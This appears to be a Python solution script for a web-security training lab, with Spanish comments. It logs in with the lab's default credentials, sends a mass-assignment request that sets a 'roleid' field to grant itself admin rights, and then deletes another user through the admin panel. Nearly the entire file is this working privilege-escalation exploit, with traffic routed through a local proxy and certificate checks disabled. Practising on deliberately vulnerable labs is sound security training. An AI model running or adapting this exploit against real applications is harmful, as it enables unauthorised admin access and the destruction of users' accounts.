import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(session, base_url):
    """Login user winier"""
    login_url = f"{base_url}/login"
    data = {
        'username': 'wiener',
        'password': 'peter'
    }
    response = session.post(login_url, data=data, verify=False, proxies=proxy_setting)
    if response.status_code == 200:
        print("[+] Login exitoso")
        
        change_email_url = f"{base_url}/my-account/change-email"
        data_json = {
            "email": "ingluipt@gmail.com",
            "roleid": 2
        }
        response_email = session.post(change_email_url, json=data_json, verify=False, proxies=proxy_setting)
        if response_email.status_code ==200:
            print("[+] Roleid cambiado")
            
            #Eliminar user carlos
            admin_panel_url = f"{base_url}/admin/delete?username=carlos"
            response_admin = session.get(admin_panel_url, verify=False, proxies=proxy_setting)
            if response_admin.status_code == 200:
                print("[+] Eliminado user carlos")
            else:
                print("[-] No fue eliminado el usuario")
            
            
        else:
            print("[-] No fue posible cambiar el rolid")
    else:
        print("[-] Login fallido")
    

def main():
    if len(sys.argv) != 2:
        print(f"[+] Uso: {sys.arg[0]} <url>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.example.com")
        exit(-1)
    
    session = requests.session()
    base_url = sys.argv[1]
    delete_user(session, base_url)
    

if __name__ == "__main__":
    main()